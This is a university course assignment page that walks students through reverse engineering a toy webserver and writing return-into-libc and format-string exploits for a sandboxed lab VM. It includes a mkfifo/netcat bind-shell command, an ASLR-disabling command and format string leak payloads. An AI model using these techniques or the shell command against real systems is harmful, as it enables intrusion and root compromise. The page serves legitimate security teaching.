<!DOCTYPE html><html lang=en><meta http-equiv=Content-Type content="text/html;charset=utf-8"> <meta name=viewport content="width=device-width, initial-scale=1"> <link rel=stylesheet href=/css/old-teaching.css type=text/css><title>Project 2</title><div id=layout-content><div id=toptitle><div id=title>Project 2</div></div><p><b>Due:</b> Thursday, October 30, 2014, 23:59<br><h2>Goal</h2><p>Unlike the previous project where you were given access to the source code of the target programs, for this project, you will have to find the vulnerabilities using only the binary, IDA Pro, and gdb.<p>All work in this project must be done on the VirtualBox virtual machine provided on the course website; see below for information about this environment.<p>You are given a single <code>server</code> binary which is a very simple webserver. The <code>server</code> program takes an optional argument specifying the port it listens to. It defaults to port 80 which requires root privileges:<div class=codeblock><div class=blockcontent><pre>user@sandbox:~/project2$ cd webroot
user@sandbox:~/project2/webroot$ sudo ./server # Or
user@sandbox:~/project2/webroot$ ./server 8080
</pre></div></div><p>Your goal is to write two exploit programs: <code>sploit1</code> and <code>sploit2</code> to get a <i>remote</i> shell from the webserver.<ul><li><p>For <code>sploit1</code>, you will modify the environment (described below) to disable executing code on the stack.<li><p>For <code>sploit2</code>, you will modify the environment again (also described below) to enable address space layout randomization (ASLR).</ul><p>For both exploit programs, you should ensure that your attack works both when the server is launched as <code>sudo ./server</code> and as <code>./server 8080</code> from inside the <code>project2/webroot</code> directory.<p>Some sample code is provided in the form of <code>fetchfile.c</code> which, when compiled and run as <code>./fetchfile localhost 8080 /index.html</code>, for example, will connect to the webserver and download the file index.html, displaying the raw server output to <code>stdout</code>.<p>Both of your exploit programs are expected to run from inside the VM (so that we have a consistent environment to test). This is most easily accomplished by configuring VirtualBox to forward a port so that you can ssh into the VM. Directions are given below.<h2>The Environment</h2><p>You (and we, for grading) will test your exploit programs within a VirtualBox virtual machine. To use this VM on your personal computer (Windows, Mac OS X, and Linux are supported), you will need to download the virtual machine image provided on the course website — sandbox-1.1.ova — as well as VirtualBox from the <a href=https://www.virtualbox.org/wiki/Downloads>VirtualBox website</a>. <b>This is the same virtual machine image you used in the previous project. If you still have it, you do not need to download it again.</b><p>We have also arranged for VirtualBox to be installed on the Windows machines in Maryland 310.<h2>Preliminaries</h2><p>1. Get the sandbox virtual machine (the same one we used for project 1).<p>2. Turn on PAE/NX by shutting down the virtual machine and going to Settings &gt; System &gt; Processor and clicking “Enable PAE/NX”.<p>3. Go to Settings &gt; Network &gt; Adapter 1 &gt; Port Forwarding and forward a port from the host machine to port 22 in the guest:<table class=imgtable><tr><td><img src=portforwarding.png alt="Port Forwarding">&nbsp;<td align=left></table><p>4. Download and unpack project2.<div class=codeblock><div class=blockcontent><pre>user@sandbox:~$ wget http://www.cs.jhu.edu/~s/teaching/cs460/2014-fall/project2.tar.gz
user@sandbox:~$ tar zxf project2.tar.gz
</pre></div></div><h2>Getting started</h2><p>1. Open the server binary in IDA.<table class=imgtable><tr><td><img src=load.png alt="Loading the binary in IDA Pro">&nbsp;<td align=left></table><p>2. With the main window selected, press spacebar to toggle between graph view and linear view.<p>3. In the <code>Functions window</code>, double clicking on the name of a function jumps the main window to that function.<p>4. Double click on <code>start</code> to move to the <code>start</code> function.<table class=imgtable><tr><td><img src=start.png alt="The start function">&nbsp;<td align=left></table><p>5. The first argument to <code>__libc_start_main</code> is the main function.<p>6. Select <code>sub_8049DCB</code> by clicking on it. Let's name it <code>main</code> by pressing <code>n</code> to rename it.<p>7. This has updated our functions list in the <code>Functions window</code>. Examine the main function by double clicking on its name, either in the Functions window or in the assembly listing.<p>8. If you are not currently in the graph view, press the spacebar to enter it. Scroll around the control flow graph either by clicking and dragging in the graph overview window or in the space between functions in the main window. The colored arrows have the following meanings:<ul><li><p>Blue: unconditional jump<li><p>Green: conditional jump taken<li><p>Red: conditional jump not taken</ul><p>9. Let's take a look at the code surrounding the call to <code>_socket</code>.<table class=imgtable><tr><td><img src=socket.png alt="The socket call">&nbsp;<td align=left></table><p>We can immediately see that the assembly was produced from code similar to the following:<div class=codeblock><div class=blockcontent><pre>sock = socket(2, 1, 0);
if (sock == -1)
{
	perror("sock = socket(PF_INET, SOCK_STREAM, 0)");
	exit(1);
}
</pre></div></div><p>Notice that the error message contains the symbolic constants used although the code only contains the numeric values.<p>10. If we are so inclined, we can have IDA replace the numeric values with the constants. First, select the <code>domain</code> parameter, 2, by clicking on it. Right clicking opens a contextual menu. Select “Use standard symbolic constant” and then select <code>PF_INET</code> from the list. Similarly, select <code>SOCK_STREAM</code> for the <code>type</code> parameter. In general, we won't have error messages that tell us what the constants we want are. In that case, we can look through the manual page for a given function to see in which system header file it is defined and then look through the header file to find the value of the constant. IDA does a good job of only suggesting constants with the appropriate numerical value, most of the time.<p>11. Identify the loop in the main function. Loops can easily be identified in the graph view by arrows that point toward earlier blocks of code. Clicking on a jump target will also highlight the label.<p>In addition to calling standard library functions, each pass through the loop calls a function in the server binary. Since this is a webserver, we can surmise that this function is responsible for handling web clients (i.e., browsers). Rename this function from <code>sub_…</code> to <code>handle_client</code> the same way we did with <code>main</code>.<p>12. Let's identify the two arguments to <code>handle_client</code>. Start by selecting <code>ebx</code> in the <code>mov [esp], ebx</code> instruction just before call <code>handle_client</code>. All instances of <code>ebx</code> are highlighted in the assembly. Looking up the code, we see that <code>ebx</code> is set most recently by the return value of the accept function. By checking the manual page for accept, we see that it returns a file descriptor (an integer) corresponding to the newly opened socket. So the first argument to <code>handle_client</code> is the socket, which makes sense.<p>The second argument to <code>handle_client</code>, which is passed in <code>[esp+4]</code>, comes from <code>esi</code>. By selecting <code>esi</code>, we see that it is used in several places but it is only assigned once via the <code>lea</code> instruction following the call to <code>listen</code>. <code>esi</code> is set to an address on the stack, namely <code>esp+28h</code>. We see that this address is passed as the <code>buf</code> argument to <code>inet_ntop</code>. The manual page reveals that <code>inet_ntop</code> writes a string containing the address to the <code>buf</code> argument.<p>Slightly more cryptically, but if <code>inet_ntop</code> does not return 0, then the 4&nbsp;byte word <code>0x0000002D</code> is written to the first word of <code>buf</code>. Recall that x86 is little endian so this is stored as <code>0x2D</code>, <code>0x00</code>, <code>0x00</code>, <code>0x00</code> in memory. By selecting the <code>2Dh</code> and pressing <code>r</code>, we see that <code>0x2D</code> is the hyphen character ‘-’. Thus if <code>inet_ntop</code> does not return 0, then the address is set to be <code>“-”</code>.<p>13. Finally, double click on handle_client. At the beginning of the function, IDA has declared a bunch of symbols like <code>var_1120</code>. These are what IDA thinks are local variables on the stack. Some of them have names already corresponding to arguments of standard library functions that IDA knows about. We can change these names as we see fit.<p>In addition to local variables, IDA can deduce information about function arguments. In particular, it knows that handle_client takes two arguments, but it thinks both are ints. We can change this by selecting handle_client and pressing <code>y</code> and giving <code>handle_client</code> the prototype:<div class=codeblock><div class=blockcontent><pre>void handle_client(int sock, const char *address)
</pre></div></div><p>After doing this, notice that the arguments have been named sock and address, similar to the local variables.<h2>Finding a vulnerability</h2><p>We could, if we wanted, spend a lot of time working out how each function works but our goal is not to understand the complete inner workings of the program. Rather, our goal is to find a way to exploit it.<p>1. Let's begin by finding usage of functions which are prone to errors. Let's start by finding all instances of <code>strcpy</code>. In the <code>Functions window</code>, double click on <code>_strcpy</code>. (As an aside, what IDA calls <code>_strcpy</code> is what gdb calls <code>strcpy@plt</code>. We'll come back to this later.) If you are in “graph view,” press the spacebar to return to “text view.” From the comment <code>CODE XREF: sub_8049214+33</code>, we can see that <code>strcpy</code> is called from exactly one location.<table class=imgtable><tr><td><img src=strcpy.png alt=strcpy>&nbsp;<td align=left></table><p>2. Double click on <code>sub_8049214</code> to be taken to that function. We can see that the destination argument to <code>strcpy</code> comes from the return value of <code>sub_8048EF9</code> and by tracing the source argument back, we see that it is the first (and only) argument to <code>sub_8049214</code>.<p>3. Examine function <code>sub_8048EF9</code>. From a quick inspection, it should be clear that this function calls <code>malloc</code>, passing its only argument and then asserts that the returned value is not <code>NULL</code>. From the argument to the <code>__assert_fail</code> function, we can see that <code>sub_8048EF9</code> is actually named xmalloc. Rename <code>sub_8048EF9</code> to <code>xmalloc</code>. This way, if we see it again, we'll immediately remember what it does.<p>4. Go back to <code>sub_8049214</code> (by pressing <code>esc</code> or by hitting the back arrow in the toolbar). At this point, it's clear that the function argument is a string that gets copied to some memory allocated on the heap. Furthermore, we can tell that a pointer to this memory is returned. All that remains is to figure out if it's allocating enough memory to hold the entire string. The few instructions before and after the <code>repne scasb</code> are actually computing the length of the string plus 1 and passing that to <code>malloc</code>. To see that, look up the definition of <code>scasb</code>, <code>repne</code>, and <code>not</code> and recall that integers are stored in twos complement.<p>Since enough space is allocated to hold the contents of the string and <code>malloc</code> is asserted to not return <code>NULL</code>, this <code>strcpy</code> does not appear to be exploitable.<p>5. It's worth noting that this function behaves very similar to the standard library function <code>strdup</code> in that it takes a string as an argument and then creates a copy of it, returning the copy. Rename the function <code>xstrdup</code> (in analogy with <code>xmalloc</code>).<p>6. Follow the same procedures to check for the presence of other potentially exploitable functions such as <code>memcpy</code> or <code>strcat</code>. By default IDA only displays 2 cross references. It's helpful to increase this number. Look in Options &gt; General… &gt; Cross-references and increase the number of displayed xrefs to 200. This should be far more than we need.<p>7. You should be able to find several buffer overflows on the stack. Which functions have overflows and what input do we need to send over the socket to trigger them?<p>Since the stack is not executable, we are not able to inject code onto the stack. We will need to try something else.<h2>Writing the first exploit</h2><p>We're going to perform a return-into-libc attack by smashing the stack in one of the error handling functions. From the last section, you should have discovered a buffer overflow on the stack when handling an incorrect HTTP version (as well as a few other places).<p>1. Run<div class=codeblock><div class=blockcontent><pre>$ sudo sh -c 'echo 0 &gt; /proc/sys/kernel/randomize_va_space'
</pre></div></div><p>This VM is configured to have ASLR enabled by default. This command will disable ASLR until either you restart the VM or you write 2 to <code>/proc/sys/kernel/randomize_va_space</code>.<p>2. Make a copy of <code>fetchfile.c</code> and name it <code>sploit1.c</code>.<p>3. A valid HTTP request line looks like:<div class=codeblock><div class=blockcontent><pre>GET /path/to/file HTTP/1.1
</pre></div></div><p>Modify <code>sploit1.c</code> to hard code a request for an arbitrary file (you can use “/” for the file, if you'd like) and a short, invalid HTTP version string. When the program is run, what is the result? What about a long, invalid HTTP version string?<p>4. Compute the distance on the stack from the saved instruction pointer to the location where the version is written to the stack. This can be computed directly from the disassembly or you can use gdb.<p>5. Produce a request string that overwrites the saved <code>eip</code> on the stack with an arbitrary value.<p>6. Find the address of the exit function in libc (gdb works nicely here) and craft input that will overwrite the saved <code>eip</code> with that address.<p>7. When you run the exploit, the server will likely crash before it returns to exit. Look carefully at the what happens after you overwrite the saved <code>eip</code>. In particular, some other values that are subsequently used as pointers are overwritten as well. Modify your exploit to overwrite those values with valid addresses. Addresses on the stack work very well.<p>8. Find the address of the system function in libc. Modify the exploit such that instead of returning to exit, it returns to <code>system</code>. The argument to system should be a pointer to a string that contains:<div class=codeblock><div class=blockcontent><pre>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc -l localhost 1234 &gt;/tmp/f;rm -f /tmp/f
</pre></div></div><p>This rather cryptic command can be understood by writing it in a more familiar format:<div class=codeblock><div class=blockcontent><pre>rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l localhost 1234 &gt; /tmp/f
rm -f /tmp/f
</pre></div></div><p>The <code>mkfifo</code> command makes a named pipe into which the <code>nc</code> command will write its output and from which <code>sh</code> will read its input. If you're not familiar with the netcat tool, read the man page. What this particular command will do is it will listen on port 1234 and on a connection, it will launch <code>sh</code>.<p>Since you don't know exactly where on the stack this string will live, you can prepend it with a large number of spaces, similar to a <code>nop</code> sled. Take care that any text after the string is ignored.<p>After <code>sploit1</code> sends the exploit string to the server, it should close the socket, sleep for a second (just to give the server process time to run and launch <code>nc</code>), and finally execute <code>nc</code>. The last 5 lines of my <code>sploit1</code>'s main function are<div class=codeblock><div class=blockcontent><pre>	sendn(sock, request, strlen(request));
	close(sock);
	sleep(1);
	execl("/bin/nc", "/bin/nc", argv[1], "1234", NULL);
	_exit(1);
</pre></div></div><p>If the server is launched as root,<div class=codeblock><div class=blockcontent><pre>$ sudo ./server
</pre></div></div><p>then when I run <code>sploit1</code>, a prompt is printed, and I can run shell commands and the response will be sent back:<div class=codeblock><div class=blockcontent><pre>$ ./sploit1 localhost 80
# whoami
root
# exit
</pre></div></div><p>Your <code>sploit1</code> should behave the same way.<h2>Writing the second exploit</h2><p>For the second exploit, the goal is the same (get a remote shell) but we're going to turn on address space layout randomization (ASLR).<p>1. Run<div class=codeblock><div class=blockcontent><pre>$ sudo sh -c 'echo 2 &gt; /proc/sys/kernel/randomize_va_space'
</pre></div></div><p>This will reenable ASLR if you have not restarted the VM since you disabled it for sploit&nbsp;1.<p>Now, if we run the server and <code>sploit1</code>, the server will crash because we relied on the address of system and the address of our string on the stack. We're going to need to perform an address disclosure attack to learn where the stack is and where libc is loaded.<p>2. Examine the four calls to <code>snprintf</code> in IDA, three of them have constant format strings, one does not. Start the server in gdb. Set a breakpoint just prior to the call to the <code>snprintf</code> that does not have a constant format string and use gdb to print the format string.<p>3. Use <code>fetchfile</code> to provide input which can be used for the format string. Try giving it file paths of the form: <code>ZZZZ%1$08x-%2$08x-%3$08x</code> and then change the 1, 2, and 3 to 4, 5, and 6 and so on until you find the value <code>ZZZZ</code>. You'll be able to see the output by watching <code>stdout</code> of server. Naturally, this information won't be available to a real client, but we will deal with that later.<p>4. Double clicking on <code>_snprintf</code> in IDA shows the implementation in the plt section:<div class=codeblock><div class=blockcontent><pre>jmp	ds:off_804B7E4
</pre></div></div><p>Although it may not be obvious, this is actually an indirect jump to an absolute address. That is, address <code>0x0804b7e4</code> contains a pointer to the actual <code>snprintf</code> function which is set by the dynamic linker after <code>snprintf</code> is called for the first time.<p>5. Copy <code>fetchfile.c</code> to <code>sploit2.c</code>. Modify <code>sploit2.c</code> so that it tries to fetch a file that contains a format string exploit. This time, instead of <code>ZZZZ%n$08x</code> for some value of n, replace the <code>ZZZZ</code> with the address <code>0x0804b7e4</code> (in little endian) and replace the <code>08x</code> with <code>s</code>. This should cause the server to treat that address as a pointer to a string and print the string. The first four bytes of which should be the address of <code>snprintf</code>.<p>6. Now modify the file string to <code>addr%m$08x%n$s</code> where addr and n are the values from step 5 and m is chosen such that it prints out the saved frame pointer (<code>ebp</code>) in hex. Hint: rather than just trying value after value like we did to find the <code>ZZZZ</code>, look at the <code>lea</code> instruction just above the call to <code>_snprintf</code> to find the start of the buffer.<p>7. In addition to writing the connection information to <code>stdout</code>, the server logs the same information to <code>server.log</code>. Since this is written in the same directory as server, we can fetch it using a normal HTTP GET.<p>Change <code>sploit2.c</code> to make two requests. The first exploits the format string vulnerability to write the address of the saved <code>ebp</code> in hex and the address of <code>snprintf</code> to <code>server.log</code> and the second fetches <code>/server.log</code>.<p>8. Read the fetched <code>server.log</code> line by line until you get to the end. Hint: Using code like<div class=codeblock><div class=blockcontent><pre>	FILE *fp = fdopen(sock, "r");
	char line[2][1024];
	int which = 0;
	while (!feof(fp) &amp;&amp; !ferror(fp) &amp;&amp; fgets(line[which], 1024, fp))
		which = !which;
	which = !which;
	fclose(fp);
</pre></div></div><p>puts the final line read from the socket in <code>line[which]</code>.<p>9. Parse the 8 byte hex string that is the saved frame pointer and the 4 byte integer that is the address of <code>snprintf</code> out of the last line read from the socket.<p>10. Add your exploit from <code>sploit1.c</code> to <code>sploit2.c</code> but make sure you adjust the address of <code>system</code>, <code>exit</code>, and the pointers to the stack appropriately. Now that you know a stack address, you can compute exactly which address the argument to system should be. Remove the “space sled” that we used for <code>sploit1</code> since it is unnecessary.<p>11. You should now be able to start the server as root and get a remote, root shell by running <code>sploit2</code> even though the process is protected by ASLR! Congratulations!<h2>Deliverables</h2><p>You are to provide a tarball (i.e., a <code>.tar.gz</code> or <code>.tar.bz2</code> file) containing <code>sploit1.c</code> and <code>sploit2.c</code>:<div class=codeblock><div class=blockcontent><pre>user@sandbox:~/project2$ tar zcf p2.tar.gz sploit1.c sploit2.c
</pre></div></div><p>We should be able to build and run your exploits without error or warning by running:<div class=codeblock><div class=blockcontent><pre>user@sandbox:~/project2$ tar zxf p2.tar.gz
user@sandbox:~/project2$ gcc -Wall -Werror -std=c99 -o sploit1 sploit1.c
user@sandbox:~/project2$ ./sploit1 localhost 80
user@sandbox:~/project2$ gcc -Wall -Werror -std=c99 -o sploit2 sploit2.c
user@sandbox:~/project2$ ./sploit2 localhost 80
</pre></div></div><p>(Of course, <code>sploit1</code> will not work with ASLR enabled.)<h2>Hint</h2><p>One of the functions you want to return to has an address that ends in <code>0x00</code>. Try looking backward several bytes from the start of the function to see if you can return there instead.<div id=footer><div id=footer-text>Last updated 2016-06-28 11:50:21 CDT.</div></div></div>